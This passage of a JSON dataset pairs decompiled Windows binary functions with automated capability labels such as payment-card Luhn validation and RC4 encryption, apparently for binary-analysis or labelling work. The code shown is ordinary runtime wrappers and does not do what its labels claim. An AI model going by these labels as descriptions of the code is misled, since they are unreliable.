        "decompiled_code": "\nvoid __cdecl fcn.004c23df(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040407f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c2413": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c2413(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004061d1(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c2447": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c2447(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040407f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c247b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c247b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040407f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c24af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c24af(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040394f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c2517": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c2517(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040394f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c254b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c254b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00403c2e(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 121
    },
    "004c257f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c257f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040394f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c25b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c25b3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040394f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 121
    },
    "004c3a2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c3a2e(uint arg_8h)\n\n{\n    uint arg_ch;\n    \n    arg_ch = fcn.00403945(1);\n    fcn.004061ae(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "004c44c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004c44c4(int16_t *arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    if (arg_8h == NULL) {\n        fcn.004041a1();\n        *(arg_ch + 8) = 0;\n        *(arg_ch + 0xc) = 0;\n    }\n    else {\n        if (*arg_8h != 0) {\n            arg_8h_00 = fcn.00406550(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n            if (arg_8h_00 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00404b01(uVar2);\n                piVar3 = fcn.004039a4();\n                return *piVar3;\n            }\n            if ((*(arg_ch + 0xc) <= arg_8h_00 && arg_8h_00 != *(arg_ch + 0xc)) &&\n               (iVar1 = fcn.0040236a(arg_8h_00),  iVar1 != 0)) {\n                return iVar1;\n            }\n            iVar1 = fcn.00406550(arg_14h, 0, arg_8h, 0xffffffff, *(arg_ch + 8), *(arg_ch + 0xc), 0, 0);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00404b01(uVar2);\n                piVar3 = fcn.004039a4();\n                return *piVar3;\n            }\n            *(arg_ch + 0x10) = iVar1 + -1;\n            return 0;\n        }\n        if ((*(arg_ch + 0xc) == 0) && (iVar1 = fcn.0040236a(1),  iVar1 != 0)) {\n            return iVar1;\n        }\n        **(arg_ch + 8) = 0;\n    }\n    *(arg_ch + 0x10) = 0;\n    return 0;\n}\n",
        "token_count": 526
    },
    "004c51c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c51c1(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.004029af(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c51ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c51ec(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00405a92(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c5217": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c5217(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.004029af(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 71
    },
    "004c5242": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c5242(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.004029af(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 71
    },
    "004c526d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c526d(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00405a92(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c5298": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c5298(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    fcn.00405a92(*arg_8h, *arg_ch, *arg_10h, *arg_14h);\n    return;\n}\n",
        "token_count": 72
    },
    "004c557c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004c557c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004c564f();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.00406302(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 128
    },
    "004c55be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004c55be(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004c56f7();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.00406302(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 129
    },
    "004c57a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004c57a2(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.00403b0c();\n    iVar2 = fcn.004023bf(arg_ch, arg_8h, uVar1);\n    if (iVar2 == 0) {\n        uVar1 = *(arg_8h + 8);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "004c57f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004c57f1(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.00403b0c();\n    iVar2 = fcn.00404e62(arg_ch, arg_8h, uVar1);\n    if (iVar2 == 0) {\n        uVar1 = *(arg_8h + 8);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "004c77ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c77ef(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405f56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c7814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c7814(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004038dc(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004c7839": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c7839(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405f56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c785e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c785e(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004038dc(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004c78c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c78c6(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004038cd(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c78eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c78eb(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405d35(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004c7cbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7cbf(void)\n\n{\n    fcn.004c8177(0, \"AreFileApisANSI\", 0x5531c0, \"AreFileApisANSI\");\n    return;\n}\n",
        "token_count": 50
    },
    "004c7cdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7cdf(void)\n\n{\n    fcn.004c8177(1, \"CompareStringEx\", 0x5531d8, 0x5531e0);\n    return;\n}\n",
        "token_count": 48
    },
    "004c7cff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7cff(void)\n\n{\n    fcn.004c8177(2, \"EnumSystemLocalesEx\", 0x5531f8, 0x553200);\n    return;\n}\n",
        "token_count": 48
    },
    "004c7dbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7dbf(void)\n\n{\n    fcn.004c8177(8, \"GetDateFormatEx\", 0x55326c, 0x553274);\n    return;\n}\n",
        "token_count": 46
    },
    "004c7e1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7e1f(void)\n\n{\n    fcn.004c8177(0xb, \"GetLocaleInfoEx\", 0x5532dc, 0x5532e4);\n    return;\n}\n",
        "token_count": 51
    },
    "004c7e7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7e7f(void)\n\n{\n    fcn.004c8177(0xe, \"GetTimeFormatEx\", 0x553350, 0x553358);\n    return;\n}\n",
        "token_count": 48
    },
    "004c7e9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7e9f(void)\n\n{\n    fcn.004c8177(0xf, \"GetUserDefaultLocaleName\", 0x553370, 0x553378);\n    return;\n}\n",
        "token_count": 49
    },
    "004c7f1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7f1f(void)\n\n{\n    fcn.004c8177(0x13, \"IsValidLocaleName\", 0x5533fc, 0x553404);\n    return;\n}\n",
        "token_count": 49
    },
    "004c7f3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7f3f(void)\n\n{\n    fcn.004c8177(0x15, \"LCIDToLocaleName\", 0x55343c, 0x553444);\n    return;\n}\n",
        "token_count": 51
    },
    "004c7f5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7f5f(void)\n\n{\n    fcn.004c8177(0x14, \"LCMapStringEx\", 0x553420, 0x553428);\n    return;\n}\n",
        "token_count": 49
    },
    "004c7f9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7f9f(void)\n\n{\n    fcn.004c8177(0x17, \"LocateXStateFeature\", 0x55347c, 0x553484);\n    return;\n}\n",
        "token_count": 51
    },
    "004c7fbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7fbf(void)\n\n{\n    fcn.004c8177(0x18, \"MessageBoxA\", 0x5534a0, 0x5534a8);\n    return;\n}\n",
        "token_count": 50
    },
    "004c7fdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7fdf(void)\n\n{\n    fcn.004c8177(0x19, \"MessageBoxW\", 0x5534bc, 0x5534c4);\n    return;\n}\n",
        "token_count": 48
    },
    "004d2894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004d2894(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004043f4(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 78
    },
    "004d32e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004d32e9(ulong param_1, ulong param_2)\n\n{\n    fcn.00401032(param_1, param_2);\n    return;\n}\n",
        "token_count": 41
    },
    "004de317": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.004de317(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b5f8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406401(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004de413(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004de373();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 290
    },
    "004de395": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.004de395(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b618, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406401(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004de4de(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004de3f1();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 291
    },
    "004dec48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.004dec48(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b5b8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406401(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004de90a(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004de874();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 290
    },
    "004deabd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004deabd(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405f56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004deae2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004deae2(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004038dc(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004deb07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004deb07(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405f56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004deb2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004deb2c(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004038dc(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004deb51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004deb51(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004038cd(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 57
    },
    "004deb76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004deb76(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405d35(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004debd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004debd7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004de317(arg_8h, arg_ch, arg_10h, 1, 0, 0);\n    return;\n}\n",
        "token_count": 61
    },
    "004debfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004debfc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004de395(arg_8h, arg_ch, arg_10h, 1, 0, 0);\n    return;\n}\n",
        "token_count": 60
    },
    "004e09b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004e09b7(void)\n\n{\n    unkint10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (in_ST0 < 0) {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n    }\n    else {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n        if ((uStack28 < 0) && (uStack24 < 0x401f)) {\n            return uStack28 >> (0x3eU - uStack24 & 0x1f);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 198
    },
    "004e0b6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004e0b6c(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    unkint10 in_ST0;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    uStack32 = in_ST0;\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (in_ST0 < 0) {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n    }\n    else {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n        if ((uStack28 < 0) && (uStack24 < 0x403f)) {\n            uVar1 = 0x3e - uStack24;\n            uVar2 = uStack28;\n            if (0x1f < uVar1) {\n                uVar2 = 0;\n                uStack32 = uStack28;\n            }\n            return CONCAT44(uVar2 >> (uVar1 & 0x1f), uStack32 >> (uVar1 & 0x1f) | uVar2 << 0x20 - (uVar1 & 0x1f));\n        }\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 319
    },
    "00406550": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00406550(uint32_t arg_8h, uint32_t arg_ch, uint lpWideCharStr, uint arg_14h, uint arg_18h, uint arg_1ch, \n            uint32_t arg_20h, uint *arg_24h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    \n    if ((arg_8h == 65000) || (arg_8h == 0xfde9)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (arg_8h < 0xc436) {\n        if ((arg_8h != 0xc435) && (arg_8h != 0x2a)) {\n            if (arg_8h < 0xc42c) {\ncode_r0x004c6c94:\n                arg_ch = arg_ch & 0xffffff7f;\n                goto code_r0x004c6ca1;\n            }\n            if ((0xc42e < arg_8h) && (arg_8h != 0xc431)) {\n                bVar2 = arg_8h == 0xc433;\ncode_r0x004c6c92:\n                if (!bVar2) goto code_r0x004c6c94;\n            }\n        }\n    }\n    else if (arg_8h != 0xd698) {\n        if (arg_8h < 0xdeaa) goto code_r0x004c6c94;\n        if ((0xdeb3 < arg_8h) && (arg_8h != 65000)) {\n            bVar2 = arg_8h == 0xfde9;\n            goto code_r0x004c6c92;\n        }\n    }\n    arg_ch = 0;\ncode_r0x004c6ca1:\n    if ((bVar1) && (arg_24h != NULL)) {\n        *arg_24h = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n              (arg_8h, arg_ch, lpWideCharStr, arg_14h, arg_18h, arg_1ch, ~-bVar1 & arg_20h, ~-bVar1 & arg_24h);\n    return;\n}\n",
        "token_count": 508
    },
    "00486708": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00486708(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (0x1f < arg_10h) {\n        do {\n            if (*arg_8h != *arg_ch) {\n                iVar1 = (*arg_8h & 0xff) - *arg_ch;\n                if (((iVar1 == 0) && (iVar1 = *(arg_8h + 1) - *(arg_ch + 1),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 2) - *(arg_ch + 2),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 3) - *(arg_ch + 3);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            if (arg_8h[1] != arg_ch[1]) {\n                iVar1 = (arg_8h[1] & 0xff) - *(arg_ch + 1);\n                if 